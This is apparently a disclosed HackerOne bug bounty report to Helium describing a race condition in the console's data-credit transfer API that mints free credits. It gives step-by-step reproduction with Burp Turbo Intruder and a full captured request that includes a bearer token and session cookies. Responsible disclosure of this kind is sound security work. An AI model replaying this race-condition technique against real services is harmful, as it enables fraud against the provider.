# Race Condition of Transfer data Credits to Organization Leads to Add Extra free Data Credits to the Organization

## Report Details
- **Report ID**: 974892
- **URL**: https://hackerone.com/reports/974892
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-09-04T18:32:29.095Z
- **Disclosed**: 2020-11-27T17:01:25.187Z

## Reporter
- **Username**: eissen5c
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: helium

## Vulnerability Information
#Description
i found an way to add data credits for free by doing race condition of transfering data credits using turbo intruder of burpsuite

when created an account with only default 10000 data credits but i managed it to add for free without buying or purchasing 

#POC Steps (if Confused refer POC Video)

* Create two Org A and B
* Go to Data Credits of that have balance of 10000
* Before Making Transfer make sure the burp suite is intercept on 
* then click transfer and make sure you see the HTTP Request of "https://console.helium.com/api/data_credits/transfer_dc" in popup example below

```
POST /api/data_credits/transfer_dc HTTP/1.1
Host: console.helium.com
Connection: close
Content-Length: 66
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IndsbXNzZUJDY01oSjdpQ3RjZ2wyeiJ9.eyJuaWNrbmFtZSI6ImVpc3NlbjVjKzIiLCJuYW1lIjoiZWlzc2VuNWMrMkB3ZWFyZWhhY2tlcm9uZS5jb20iLCJwaWN0dXJlIjoiaHR0cHM6Ly9zLmdyYXZhdGFyLmNvbS9hdmF0YXIvM2E1YTY3MjhlODkyN2YxYTgxYmJiZWQzY2I0MGI2OWI_cz00ODAmcj1wZyZkPWh0dHBzJTNBJTJGJTJGY2RuLmF1dGgwLmNvbSUyRmF2YXRhcnMlMkZlaS5wbmciLCJ1cGRhdGVkX2F0IjoiMjAyMC0wOS0wNFQxNzo1NDowNy4xMjFaIiwiZW1haWwiOiJlaXNzZW41YysyQHdlYXJlaGFja2Vyb25lLmNvbSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJpc3MiOiJodHRwczovL2F1dGguaGVsaXVtLmNvbS8iLCJzdWIiOiJhdXRoMHw1ZjUyN2YwYTMzYzBhMjAwNmQ1OTJjNDkiLCJhdWQiOiJiSGx0N043MEhPVHFZSkJ2R2NvbjFsQVJGcDc4WFczMyIsImlhdCI6MTU5OTI0MjI0NCwiZXhwIjoxNTk5Mjc4MjQ0LCJub25jZSI6InJhQ25sSE1kM1o4cERManNORUt0Rk80R2ZBZlRkUDdfUkIyWXRGNTB4MlcifQ.LdiVe8woYQ9nKky6s9x0AdcH75gf0lrSqO9wWhTW6aD38VDesRgZQZcopvKWwltdv0g6cfd0qSc0NOXSTJU-YCxnM_SmTwQdzz_w7t3tdj4H4NPMgxvk7Wi0Q0Ot5gnBFy-Hs43kNq_6JgON2fdOd3ANxTPyKo10sp_z_9I6XoPydUKl0vWOqCAAtqWY09yKnsAcUOiKAvwlToyRPpyzb0CiB2CkITgXRpq5I5dkx0MSikgfOtbMgHwXIwyR4221VaU9quZ21gHCj5h_b-eS5ZDK8c5lqrjheNHv0hSSquDOUJ-PJuZIXmdzthC4nDNUXFr56h5yBxdwvz14mF-xIQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
organization: 9eda512e-7d7b-4884-95a1-05289cd0986f
Content-Type: application/json
Origin: https://console.helium.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://console.helium.com/datacredits/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: __cfduid=d6c96a4a7e23c1a9288364ad41fe940441598519944; __stripe_mid=38940331-8c51-426f-9677-d823149a19c5e78eb8; intercom-id-uj330shp=8a7342fa-569f-458d-8a48-99a7d7b04ce8; intercom-session-uj330shp=; _ga=GA1.2.619170841.1599241231; _gid=GA1.2.1901543145.1599241231; ajs_anonymous_id=%22b9db00a3-41f6-494d-a4a5-7d536b460f69%22; _fbp=fb.1.1599241231521.572784627; a0.spajs.txs.bmJZUTBDWEJvVVJZWTQ1eE8xNmp2NWRLMWVmfi5UNFZ0bUxNWDYyQ3g0cA%3D%3D={%22nonce%22:%22SJi.KgEbopUDCs8F2D0kIH88ijdqst6UStDRbHkTLra%22%2C%22code_verifier%22:%22RlDt9XH2A5lQhpXebqa1eK5V1-jM_0bvJq-IsIWDWQ5%22%2C%22appState%22:{%22targetUrl%22:%22/%22%2C%22params%22:%22%22}%2C%22scope%22:%22openid%20profile%20email%22%2C%22audience%22:%22default%22%2C%22redirect_uri%22:%22https://console.helium.com%22}; __stripe_sid=caa82502-18e1-4d95-adc4-af3a7c1c238ef69a16; auth0.is.authenticated=true; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjUzMDMzZDY4LTc1NTMtNDhmNC05YmY5LWQ0NDZhOTE1NWUyZFIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTU5OTI0MTMxOTIyMywibGFzdEV2ZW50VGltZSI6MTU5OTI0MjIxOTg3NywiZXZlbnRJZCI6NTYsImlkZW50aWZ5SWQiOjI0LCJzZXF1ZW5jZU51bWJlciI6ODB9

{"countDC":"10000","orgId":"51e43268-248d-430d-8f3a-8a9de94bdcc9"}
```
* Send it to Turbo Intruder and Select Race.py Script
* Go Boom execute and refresh the balance

# POC Image

### Race Condition
* {F976455}

### Race Condition
* {F976456}

### Data Credit History
* {F976463}

### Organization View with Data Credit Balance
* {F976465}

### Email Notification
* {F976469}


# POC Video (PS . i uploaded on dropbox due to slow internet connection and problems uploading to hackerone directly sorry about that)
https://www.dropbox.com/s/8xuipexpiyz7lp3/2020-09-05%2002-02-41.mkv?dl=0

## Impact

Abusing the Race Condition inorder to add extra free data Credits to the organization without buying and lead to business impact

## Attachments
- POC1.PNG
- POC2.PNG
- POC3.PNG
- POC4.PNG
- POC5.PNG
